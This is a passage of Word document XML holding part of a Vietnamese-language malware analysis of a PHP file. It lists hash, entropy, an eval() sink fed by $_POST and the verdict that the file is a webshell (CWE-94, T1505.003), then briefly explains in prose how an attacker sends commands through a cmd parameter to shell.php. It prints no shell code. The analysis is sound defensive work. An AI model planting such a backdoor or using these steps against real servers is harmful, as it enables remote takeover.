        <w:t xml:space="preserve"> 2   |   MD5 `b4222ff2...`   |   Dấu vân tay của file </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3   |   Entropy 5.31   |   Thấp → mã đọc được, không giấu gì </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4   |   Lệnh sink: `eval()` + input `$_POST`   |   Có eval chạy dữ liệu người dùng gửi lên </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5   |   Không có IoC   |   Tấn công trực tiếp, không cần C2 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6   |   **MÃ ĐỘC** — Webshell, CWE-94, T1505.003   |   Kết luận: backdoor nguy hiểm </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cách hacker khai thác file này:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Hacker mở trình duyệt, gửi yêu cầu tới `shell.php` với tham số `cmd`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Server nhận `cmd`, ném vào `eval()`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. `eval()` chạy lệnh đó → hacker điều khiển được server từ xa.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